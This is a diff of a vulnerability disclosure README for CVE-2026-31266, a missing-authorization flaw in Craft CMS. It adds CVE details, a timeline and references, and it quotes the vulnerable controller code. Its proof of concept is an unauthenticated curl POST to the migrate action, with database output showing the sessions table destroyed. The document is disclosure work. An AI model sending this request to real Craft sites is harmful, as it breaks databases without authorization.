@@ -1,24 +1,31 @@
-# Craft CMS CVE - Missing Authorization
+# CVE-2026-31266 - Craft CMS Missing Authorization
+
+## CVE Information
+| Field | Value |
+|-------|-------|
+| **CVE ID** | CVE-2026-31266 |
+| **Vendor** | Pixel & Tonic |
+| **Product** | Craft CMS |
+| **Affected Versions** | <= 5.9.5 |
+| **CWE** | CWE-862 (Missing Authorization) |
+| **CVSS** | 6.5 (Medium) |
+| **Discoverer** | 0xRIXET |
 
 ## Evidence Contents
 - `screenshots/` - Proof of Concept demonstrations
 - `vendor_refusal/` - Vendor refusal evidence
 
 ## Vulnerability
-- Type: Missing Authorization
-- Impact: Authentication Bypass
-- Vendor: Craft CMS
-- Status: Vendor refused to acknowledge
-
-## Contact
-- Researcher: 0xRIXET
-- Email: 0xrixet@gmail.com
+- **Type:** Missing Authorization
+- **Impact:** Authentication Bypass
+- **Vendor:** Craft CMS
+- **Status:** ✅ CVE Assigned (CVE-2026-31266)
 
 ## Vulnerable Code
 
-File: `src/controllers/AppController.php`
+**File:** `src/controllers/AppController.php`
 
-Lines 65-68:
+**Lines 65-68:**
 ```php
 protected array|bool|int $allowAnonymous = [
     'migrate' => self::ALLOW_ANONYMOUS_LIVE | self::ALLOW_ANONYMOUS_OFFLINE,
@@ -26,6 +33,7 @@ protected array|bool|int $allowAnonymous = [
 ```
 
 ## Proof of Concept
+
 ```bash
 # With allowAdminChanges=false
 curl -X POST "http://target/actions/app/migrate"
@@ -47,4 +55,20 @@ mysql> SELECT COUNT(*) FROM sessions;
 ```sql
 mysql> SELECT COUNT(*) FROM sessions;
 ERROR 1146 (42S02): Table 'sessions' doesn't exist
+```
 
+## Timeline
+- **Feb 2026:** Vulnerability discovered
+- **Feb 2026:** Vendor notified via GitHub Security Advisory
+- **Feb 2026:** Vendor disputed as "expected behavior"
+- **Feb 2026:** Submitted to MITRE
+- **April 7, 2026:** CVE-2026-31266 assigned by MITRE
+
+## References
+- [Craft CMS Repository](https://github.com/craftcms/cms)
+- [Craft Security Documentation](https://craftcms.com/knowledge-base/securing-craft)
+- [NVD Entry](https://nvd.nist.gov/vuln/detail/CVE-2026-31266) *(pending)*
+
+## Contact
+- **Researcher:** 0xRIXET
+- **Email:** 0xrixet@gmail.com
